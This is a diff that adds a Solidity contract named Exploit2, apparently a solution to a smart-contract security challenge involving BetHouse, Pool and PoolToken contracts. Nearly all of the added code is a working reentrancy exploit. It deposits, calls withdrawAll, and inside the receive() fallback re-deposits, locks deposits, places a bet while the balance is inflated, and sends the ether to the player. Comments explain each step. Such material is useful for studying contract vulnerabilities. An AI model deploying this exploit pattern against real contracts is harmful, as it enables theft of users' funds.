@@ -147,3 +147,53 @@ contract Depositor {
         PoolToken(pool.wrappedToken()).transfer(playerAddr, 10);
     }
 }
+
+contract Exploit2 {
+    BetHouse betHouse;
+    Pool pool;
+    PoolToken depositToken;
+    address player;
+
+    constructor(address betHouseAddr, address playerAddr) {
+        betHouse = BetHouse(betHouseAddr);
+        pool = Pool(betHouse.pool());
+        depositToken = PoolToken(pool.depositToken());
+        player = playerAddr;
+    }
+
+    function exploit() external payable {
+        if (msg.value != 0.001 ether) {
+            revert("send 0.001 ether to this contract to exploit");
+        }
+
+        // check deposit token balance of this contract
+        if (depositToken.balanceOf(address(this)) < 5) {
+            revert("transfer 5 deposit tokens to this contract to exploit");
+        }
+
+        // deposit 5 deposit tokens and 0.001 ether
+        // get 15 wrapped tokens
+        depositToken.approve(address(pool), 5);
+        pool.deposit{value: msg.value}(5);
+
+        // withdraw all (0.001 ether and 5 deposit tokens)
+        pool.withdrawAll();
+    }
+
+    // withdrawn ether will be caught here
+    receive() external payable {
+        // deposit 5 deposit tokens again
+        // get 5 wrapped tokens, total count of wrapped tokens is 20
+        depositToken.approve(address(pool), 5);
+        pool.deposit(5);
+
+        // lock deposits to ensure making bet is possible
+        pool.lockDeposits();
+
+        // make bet
+        betHouse.makeBet(player);
+
+        // withdraw ether
+        player.call{value: address(this).balance}("");
+    }
+}
